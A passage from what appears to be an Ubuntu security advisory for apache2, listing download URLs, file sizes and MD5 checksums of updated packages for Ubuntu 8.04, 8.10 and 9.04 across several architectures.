http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-doc_2.2.8-1ubuntu0.1 \\\r\n4_all.deb  Size/MD5:  1929318 d4faaf64c2c0af807848ea171a4efa90\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-perchild_2.2.8-1 \\\r\nubuntu0.14_all.deb  Size/MD5:    72920 065d63c19b22f0f7a8f7c28952b0b408\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-src_2.2.8-1ubuntu0.1 \\\r\n4_all.deb  Size/MD5:  6258048 33c48a093bbb868ea108a50c051437cf\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.8-1ubuntu0.14_al \\\r\nl.deb  Size/MD5:    45850 07a9463a8e4fdf1a48766d5ad08b9a3c\r\n\r\n  amd64 architecture (Athlon64, Opteron, EM64T Xeon):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.8-1ubu \\\r\nntu0.14_amd64.deb  Size/MD5:   253080 3c6467ee604002a5b8ebffff8554c568\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.8-1u \\\r\nbuntu0.14_amd64.deb  Size/MD5:   248676 3c83ce9eb0a27f18b9c3a8c3e651cafa\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.8-1ub \\\r\nuntu0.14_amd64.deb  Size/MD5:   252490 cf379a515d967d89d2009be9e06d4833\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.8-1u \\\r\nbuntu0.14_amd64.deb  Size/MD5:   205592 af6cb62114d2e70bf859c32008a66433\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.8-1 \\\r\nubuntu0.14_amd64.deb  Size/MD5:   206350 9c3d5ef8e55eee98cc3e75f2ed9ffaff\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.8-1ubuntu0 \\\r\n.14_amd64.deb  Size/MD5:   141660 958585d6391847cd5a618464054f7d37\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.8-1ubun \\\r\ntu0.14_amd64.deb  Size/MD5:   803974 76d23bd94465a2f96711dc1c41b31af0\r\n\r\n  i386 architecture (x86 compatible Intel/AMD):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.8-1ubu \\\r\nntu0.14_i386.deb  Size/MD5:   236060 ad4c00dc10b406cc312982b7113fa468\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.8-1u \\\r\nbuntu0.14_i386.deb  Size/MD5:   231580 07ae6a192e6c859e49d48f2b2158df40\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.8-1ub \\\r\nuntu0.14_i386.deb  Size/MD5:   235308 18a44bbffcebde8f2d66fe3a6bdbab6d\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.8-1u \\\r\nbuntu0.14_i386.deb  Size/MD5:   205594 73ec71599d4c8a42a69ac3099b9d50cf\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.8-1 \\\r\nubuntu0.14_i386.deb  Size/MD5:   206374 c1524e4fa8265e7eaac046b114b8c463\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.8-1ubuntu0 \\\r\n.14_i386.deb  Size/MD5:   140644 379a125b8b5b51ff8033449755ab87b8\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.8-1ubun \\\r\ntu0.14_i386.deb  Size/MD5:   755574 9de96c8719740c2525e3c0cf7836d60b\r\n\r\n  lpia architecture (Low Power Intel Architecture):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.8-1ubuntu0.14_lp \\\r\nia.deb  Size/MD5:   235578 0265d4f6ccee2d7b5ee10cfff48fed08\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.8-1ubuntu0.14_ \\\r\nlpia.deb  Size/MD5:   231234 611499fb33808ecdd232e2c5350f6838\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.8-1ubuntu0.14_l \\\r\npia.deb  Size/MD5:   234738 d7757d2da2e542ce0fdad5994be1d8bd\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.8-1ubuntu0.14_ \\\r\nlpia.deb  Size/MD5:   205592 c10ac9eb401184c379b7993b6a62cde3\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.8-1ubuntu0.14 \\\r\n_lpia.deb  Size/MD5:   206358 fc91c0159b096e744c42014e6e5f8909\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.8-1ubuntu0.14_lpia.d \\\r\neb  Size/MD5:   141212 f87d5f443e5d8e1c3eda6f976b3ceb06\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.8-1ubuntu0.14_lpi \\\r\na.deb  Size/MD5:   749716 86ae389b81b057288ff3c0b69ef68656\r\n\r\n  powerpc architecture (Apple Macintosh G3/G4/G5):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.8-1ubuntu0.14_po \\\r\nwerpc.deb  Size/MD5:   254134 4337f858972022fa196c9a1f9bb724fb\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.8-1ubuntu0.14_ \\\r\npowerpc.deb  Size/MD5:   249596 44a6e21ff8fa81d09dab19cab4caffdb\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.8-1ubuntu0.14_p \\\r\nowerpc.deb  Size/MD5:   253698 f101a1709f21320716d4c9afb356f24f\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.8-1ubuntu0.14_ \\\r\npowerpc.deb  Size/MD5:   205604 3f4d4f6733257a7037e35101ef792352\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.8-1ubuntu0.14 \\\r\n_powerpc.deb  Size/MD5:   206386 06402188459de8dab5279b5bfef768fa\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.8-1ubuntu0.14_powerp \\\r\nc.deb  Size/MD5:   158390 0acffbdb7e5602b434c4f2805f8dc4d0\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.8-1ubuntu0.14_pow \\\r\nerpc.deb  Size/MD5:   906022 28c3e8b63d123a4ca0632b3fed6720b5\r\n\r\n  sparc architecture (Sun SPARC/UltraSPARC):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.8-1ubuntu0.14_sp \\\r\narc.deb  Size/MD5:   237422 5651f53b09c0f36e1333c569980a0eb0\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.8-1ubuntu0.14_ \\\r\nsparc.deb  Size/MD5:   233152 1165607c64c57c84212b6b106254e885\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.8-1ubuntu0.14_s \\\r\nparc.deb  Size/MD5:   236606 bbe00d0707c279a16eca35258dd8f13a\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.8-1ubuntu0.14_ \\\r\nsparc.deb  Size/MD5:   205598 76afcd4085fa6f39055a5a3f1ef34a43\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.8-1ubuntu0.14 \\\r\n_sparc.deb  Size/MD5:   206372 5c67270e0a19d1558cf17cb21a114833\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.8-1ubuntu0.14_sparc. \\\r\ndeb  Size/MD5:   143838 28e9c3811feeac70b846279e82c23430\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.8-1ubuntu0.14_spa \\\r\nrc.deb  Size/MD5:   765398 92c5b054b80b6258a1c4caac8248a40a\r\n\r\nUpdated packages for Ubuntu 8.10:\r\n\r\n  Source archives:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.9-7ubuntu3.5.dif \\\r\nf.gz  Size/MD5:   137715 0e8a6128ff37a1c064d4ce881b5d3df9\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.9-7ubuntu3.5.dsc \\\r\n  Size/MD5:     1788 5e3c3d53b68ea3053bcca3a5e19f5911\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.9.orig.tar.gz\r\n      Size/MD5:  6396996 80d3754fc278338033296f0d41ef2c04\r\n\r\n  Architecture independent packages:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-doc_2.2.9-7ubuntu3.5 \\\r\n_all.deb  Size/MD5:  2041786 cd1e98fb2064bad51f7845f203a07d79\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-src_2.2.9-7ubuntu3.5 \\\r\n_all.deb  Size/MD5:  6538578 32e07db65f1e7b3002aedc3afce1748c\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.9-7ubuntu3.5_all \\\r\n.deb  Size/MD5:    45474 0f1b4fb499af61a596241bd4f0f4d35d\r\n\r\n  amd64 architecture (Athlon64, Opteron, EM64T Xeon):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.9-7ubu \\\r\nntu3.5_amd64.deb  Size/MD5:   254968 f2004f847cc5cbc730599352ad1f7dc6\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.9-7u \\\r\nbuntu3.5_amd64.deb  Size/MD5:   249196 fb001fc4f192e9b8ae1bb7161925413c\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.9-7ub \\\r\nuntu3.5_amd64.deb  Size/MD5:   254360 419b942bad4cf4d959afcfa3ce4314e2\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.9-7u \\\r\nbuntu3.5_amd64.deb  Size/MD5:   208524 0d87bf6acbf1ab5dc48c68debe7c0d26\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-suexec-custom_2.2.9- \\\r\n7ubuntu3.5_amd64.deb  Size/MD5:    84490 2a4df4b619debe549f48ac3e9e764305\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-suexec_2.2.9-7ubuntu \\\r\n3.5_amd64.deb  Size/MD5:    82838 215665711684d5b5dd04cdfa23d36462\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.9-7 \\\r\nubuntu3.5_amd64.deb  Size/MD5:   209550 496d387e315370c0cd83489db663a356\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.9-7ubuntu3 \\\r\n.5_amd64.deb  Size/MD5:   147762 48061b9015c78b39b7afd834f4c81ae0\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.9-7ubun \\\r\ntu3.5_amd64.deb  Size/MD5:   820242 3497441009bc9db76a87fd2447ba433c\r\n\r\n  i386 architecture (x86 compatible Intel/AMD):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.9-7ubu \\\r\nntu3.5_i386.deb  Size/MD5:   241376 488812d1a311fd67dafd5b18b6813920\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.9-7u \\\r\nbuntu3.5_i386.deb  Size/MD5:   236082 9256681808703f40e822c81b53f4ce3e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.9-7ub \\\r\nuntu3.5_i386.deb  Size/MD5:   240668 2b6b7c11a88ed5a280f603305bee880e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.9-7u \\\r\nbuntu3.5_i386.deb  Size/MD5:   208532 e0eccceba6cae5fb12f431ff0283a23e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-suexec-custom_2.2.9- \\\r\n7ubuntu3.5_i386.deb  Size/MD5:    83922 ea5f69f36e344e493cce5d9c0bc69c46\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-suexec_2.2.9-7ubuntu \\\r\n3.5_i386.deb  Size/MD5:    82320 0d9b2f9afff4b9efe924b59e9bb039ea\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.9-7 \\\r\nubuntu3.5_i386.deb  Size/MD5:   209554 f4e53148ae30d5c4f060d455e4f11f95\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.9-7ubuntu3 \\\r\n.5_i386.deb  Size/MD5:   146596 5ed6a4af9378bacfb7d4a034d9923915\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.9-7ubun \\\r\ntu3.5_i386.deb  Size/MD5:   778564 ffd7752394933004094c13b00113b263\r\n\r\n  lpia architecture (Low Power Intel Architecture):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.9-7ubuntu3.5_lpi \\\r\na.deb  Size/MD5:   238358 4955c7d577496ea4f3573345fad028a4\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.9-7ubuntu3.5_l \\\r\npia.deb  Size/MD5:   232964 76aecf38baba17a8a968329b818ec74a\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.9-7ubuntu3.5_lp \\\r\nia.deb  Size/MD5:   237626 83f32bd08e2e206bbdb9f92cfb1a37e5\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.9-7ubuntu3.5_l \\\r\npia.deb  Size/MD5:   208528 6672fb116e108687669c89197732fbb0\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-suexec-custom_2.2.9-7ubuntu3.5 \\\r\n_lpia.deb  Size/MD5:    83870 b8f875f197017aec0fe8203c203065d7\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-suexec_2.2.9-7ubuntu3.5_lpia.d \\\r\neb  Size/MD5:    82296 d6724391ed540b351e2b660ba98af1ca\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.9-7ubuntu3.5_ \\\r\nlpia.deb  Size/MD5:   209550 263b43fb11c6d954d5a4bf7839e720a4\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.9-7ubuntu3.5_lpia.de \\\r\nb  Size/MD5:   146282 a225b8d0f48e141eea28b2369d4595c0\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.9-7ubuntu3.5_lpia \\\r\n.deb  Size/MD5:   766494 454c737e191429c43ad3f28c9e0294a0\r\n\r\n  powerpc architecture (Apple Macintosh G3/G4/G5):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.9-7ubuntu3.5_pow \\\r\nerpc.deb  Size/MD5:   261510 d3e1155682726cc28859156e647d97b3\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.9-7ubuntu3.5_p \\\r\nowerpc.deb  Size/MD5:   256082 e49d894a6e9ab612a3cbd2f189ca3d8d\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.9-7ubuntu3.5_po \\\r\nwerpc.deb  Size/MD5:   260850 bc3cd7677cd630ac00424e73a3a6b343\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.9-7ubuntu3.5_p \\\r\nowerpc.deb  Size/MD5:   208542 ae1cc6b1323832528ad8f0e7130ec87d\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-suexec-custom_2.2.9-7ubuntu3.5 \\\r\n_powerpc.deb  Size/MD5:    84558 68452b686e89320007e9c5367ce36345\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-suexec_2.2.9-7ubuntu3.5_powerp \\\r\nc.deb  Size/MD5:    82908 2b8c5fc4bdec1017735dc16eba41d0a6\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.9-7ubuntu3.5_ \\\r\npowerpc.deb  Size/MD5:   209562 a8da7487e3dcd1bdff008956728b8dd3\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.9-7ubuntu3.5_powerpc \\\r\n.deb  Size/MD5:   161030 a5ffe07d5e3050c8a54c4fccd3732263\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.9-7ubuntu3.5_powe \\\r\nrpc.deb  Size/MD5:   926240 8282583e86e84bd256959540f39a515d\r\n\r\n  sparc architecture (Sun SPARC/UltraSPARC):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.9-7ubuntu3.5_spa \\\r\nrc.deb  Size/MD5:   246720 e54b4b9b354001a910ec9027dc90b0d2\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.9-7ubuntu3.5_s \\\r\nparc.deb  Size/MD5:   241280 1eea25472875056e34cd2c3283c60171\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.9-7ubuntu3.5_sp \\\r\narc.deb  Size/MD5:   246024 5709e7421814ecfb83fff5804d429971\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.9-7ubuntu3.5_s \\\r\nparc.deb  Size/MD5:   208528 25cdfd0177da7e5484d3d44f93257863\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-suexec-custom_2.2.9-7ubuntu3.5 \\\r\n_sparc.deb  Size/MD5:    84096 3ffbacffcc23ffc640a2ce05d35437bf\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-suexec_2.2.9-7ubuntu3.5_sparc. \\\r\ndeb  Size/MD5:    82470 17d1ca84f9455c492013f4f754a1d365\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.9-7ubuntu3.5_ \\\r\nsparc.deb  Size/MD5:   209546 696ef3652703523aea6208a4e51e48f1\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.9-7ubuntu3.5_sparc.d \\\r\neb  Size/MD5:   150932 44c89e0249c85eed09b6f3a6a23db59d\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.9-7ubuntu3.5_spar \\\r\nc.deb  Size/MD5:   783902 773a80d7a85a452016da3b10b1f3ae43\r\n\r\nUpdated packages for Ubuntu 9.04:\r\n\r\n  Source archives:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.11-2ubuntu2.5.di \\\r\nff.gz  Size/MD5:   141023 50d6737005a6d4fe601e223a39293f99\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.11-2ubuntu2.5.ds \\\r\nc  Size/MD5:     1795 59720f4d7ad291c986d92ec120750c3d\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.11.orig.tar.gz\r\n      Size/MD5:  6806786 03e0a99a5de0f3f568a0087fb9993af9\r\n\r\n  Architecture independent packages:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-doc_2.2.11-2ubuntu2. \\\r\n5_all.deb  Size/MD5:  2219326 d29c903489b894ddf88b23a0fec23e5c\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.11-2ubuntu2.5_al \\\r\nl.deb  Size/MD5:    46636 ee03585b00f277ed98c0de07a683317a\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-src_2.2.11-2ubun \\\r\ntu2.5_all.deb  Size/MD5:  6948222 a3505a83c13cf36c86248079127dd84d\r\n\r\n  amd64 architecture (Athlon64, Opteron, EM64T Xeon):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.11-2ub \\\r\nuntu2.5_amd64.deb  Size/MD5:   259028 5e9bddefad4c58c3ef9fd15d7a06988d\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.11-2 \\\r\nubuntu2.5_amd64.deb  Size/MD5:   253218 ee1bfbb759ffade3a52a6782e2f4b66d\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.11-2u \\\r\nbuntu2.5_amd64.deb  Size/MD5:   258414 8ef063026de9790bac1965427ce1b584\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.11-2 \\\r\nubuntu2.5_amd64.deb  Size/MD5:   213294 09701d434bd102e4205e551b4525afd1\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.11- \\\r\n2ubuntu2.5_amd64.deb  Size/MD5:   214258 e98de48ea01e1132c5f1248a9a018745\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.11-2ubuntu \\\r\n2.5_amd64.deb  Size/MD5:   151140 2f7c7f14b843b2c24de8c67356406449\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.11-2ubu \\\r\nntu2.5_amd64.deb  Size/MD5:   826834 28abdf1c7be886e9be2825d351abaec7\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec-custom_2. \\\r\n2.11-2ubuntu2.5_amd64.deb  Size/MD5:    87818 670c62615e107920c45893b3377ab2a0\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec_2.2.11-2u \\\r\nbuntu2.5_amd64.deb  Size/MD5:    86094 5a7c68fd37066287b4819cba4cfed1f2\r\n\r\n  i386 architecture (x86 compatible Intel/AMD):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.11-2ub \\\r\nuntu2.5_i386.deb  Size/MD5:   245538 952540b7679ebc8d3ffc953f32d3be0f\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.11-2 \\\r\nubuntu2.5_i386.deb  Size/MD5:   240048 08a7fd4888ffd9188890e57c613c4be7\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.11-2u \\\r\nbuntu2.5_i386.deb  Size/MD5:   244914 955bb5121da808d44aa994386d90723f\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.11-2 \\\r\nubuntu2.5_i386.deb  Size/MD5:   213308 dd16143608ff8c41cb2d5cd27212a57e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.11- \\\r\n2ubuntu2.5_i386.deb  Size/MD5:   214280 1e1f5d6feef40413f823a19126a018e3\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.11-2ubuntu \\\r\n2.5_i386.deb  Size/MD5:   150046 0769d86d26282d1d31615050ae5b8915\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.11-2ubu \\\r\nntu2.5_i386.deb  Size/MD5:   784198 8760e9c37147d0472dbbfe941c058829\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec-custom_2. \\\r\n2.11-2ubuntu2.5_i386.deb  Size/MD5:    87182 21980cb1035d05f69b857870bbcbc085\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec_2.2.11-2u \\\r\nbuntu2.5_i386.deb  Size/MD5:    85572 6a1b8a5e4cb19e815e88335757b06cf3\r\n\r\n  lpia architecture (Low Power Intel Architecture):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.11-2ubuntu2.5_lp \\\r\nia.deb  Size/MD5:   242386 859ad63822b7e82c81cd6dcaca088c4a\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.11-2ubuntu2.5_ \\\r\nlpia.deb  Size/MD5:   236924 200538ce94218c9d8af8532636bfd40a\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.11-2ubuntu2.5_l \\\r\npia.deb  Size/MD5:   241822 3a3183ea4ee77d2677919d3b698f92a1\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.11-2ubuntu2.5_ \\\r\nlpia.deb  Size/MD5:   213286 bf81273b1db0a4a621085171c2b2b421\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.11-2ubuntu2.5 \\\r\n_lpia.deb  Size/MD5:   214264 ed278dab71289d2baae2ea409382fbf8\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.11-2ubuntu2.5_lpia.d \\\r\neb  Size/MD5:   149758 75f6e2d7bd1cdfe5b1806062c3c859df\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.11-2ubuntu2.5_lpi \\\r\na.deb  Size/MD5:   773424 c7cdc26051bd9443ae25b73776537fb5\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec-custom_2.2.11-2ubun \\\r\ntu2.5_lpia.deb  Size/MD5:    87132 32e7ea89c96a0afce7ce1da457d947fb\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec_2.2.11-2ubuntu2.5_l \\\r\npia.deb  Size/MD5:    85550 1d9b5963aa6ea5c01492ec417ab8510a\r\n\r\n  powerpc architecture (Apple Macintosh G3/G4/G5):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.11-2ubuntu2.5_po \\\r\nwerpc.deb  Size/MD5:   265476 5d03fe6b2da8de98c876941ff78b066f\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.11-2ubuntu2.5_ \\\r\npowerpc.deb  Size/MD5:   260478 3e3aeaaf496cc86c62a831c59994c1f2\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.11-2ubuntu2.5_p \\\r\nowerpc.deb  Size/MD5:   265154 5eae30e7a33c09b37483f3aab595d0e9\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.11-2ubuntu2.5_ \\\r\npowerpc.deb  Size/MD5:   213314 879534ebabbb8be86b606e1800dc9cf8\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.11-2ubuntu2.5 \\\r\n_powerpc.deb  Size/MD5:   214286 922033231a6aa67ecca1c400d47f09c1\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.11-2ubuntu2.5_powerp \\\r\nc.deb  Size/MD5:   164444 74faf68f0baeffcd011155ca9b201039\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.11-2ubuntu2.5_pow \\\r\nerpc.deb  Size/MD5:   932416 2911758e4ad1b3b401369621301ea76f\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec-custom_2.2.11-2ubun \\\r\ntu2.5_powerpc.deb  Size/MD5:    87876 1d45c033ec5498c092f30188cf1d481e\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec_2.2.11-2ubuntu2.5_p \\\r\nowerpc.deb  Size/MD5:    86154 52c1d8806d52fef6f43ab53662953953\r\n\r\n  sparc architecture (Sun SPARC/UltraSPARC):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-event_2.2.11-2ubuntu2.5_sp \\\r\narc.deb  Size/MD5:   250786 4e8e98dcba5543394ed5f07d141ce408\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-prefork_2.2.11-2ubuntu2.5_ \\\r\nsparc.deb  Size/MD5:   245094 a82bf04fc92b8c275b0c0f25cc81ff91\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-mpm-worker_2.2.11-2ubuntu2.5_s \\\r\nparc.deb  Size/MD5:   250110 092cf734813ae1d127d7b4f498f936c1\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.11-2ubuntu2.5_ \\\r\nsparc.deb  Size/MD5:   213312 98d7062a6bdb58637f7e850b76bfbc80\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.11-2ubuntu2.5 \\\r\n_sparc.deb  Size/MD5:   214286 a378e2e0418631cec0f398379a446172\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.11-2ubuntu2.5_sparc. \\\r\ndeb  Size/MD5:   154284 ce8b7bbccd359675b70426df15becfed\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-common_2.2.11-2ubuntu2.5_spa \\\r\nrc.deb  Size/MD5:   789298 11f088b18425b97367d5bc141da2ef2f\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec-custom_2.2.11-2ubun \\\r\ntu2.5_sparc.deb  Size/MD5:    87384 477b6594866c8c73a8a3603e7e646c68\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec_2.2.11-2ubuntu2.5_s \\\r\nparc.deb  Size/MD5:    85686 